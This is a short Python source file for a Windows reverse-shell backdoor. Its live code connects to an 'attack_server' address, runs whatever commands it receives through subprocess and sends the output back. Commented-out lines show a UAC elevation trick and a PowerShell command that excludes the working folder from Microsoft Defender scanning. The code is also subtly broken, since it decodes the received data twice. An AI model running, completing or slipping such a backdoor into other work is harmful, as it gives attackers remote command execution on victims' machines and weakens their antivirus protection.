import os,socket,subprocess,threading
import sys
import win32com.shell.shell as shell

# ### UAC to get Admin
# if sys.argv[-1] != 'asadmin':
#     script = os.path.abspath(sys.argv[0])
#     params = ' '.join([script]+sys.argv[1:]+['asadmin'])
#     shell.ShellExecuteEx(lpVerb='runas',lpFile=sys.executable,lpParameters=params)
#     sys.exit(0)

# script = "powershell -Command Add-MpPreference -ExclusionPath "+os.getcwd()
# subprocess.call(script,shell=True)
# #os.system("pause")

### Backdoor
import socket
import subprocess

print("client start...")
host = "localhost" #address of attack_server
port = 80 #port of attack_server

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

while True:
    try:
        data = s.recv(10000).decode()
        print(data[:2])
        output=subprocess.getoutput(data.decode())
        s.sendall(output.encode())
    except Exception as e:
        print(e)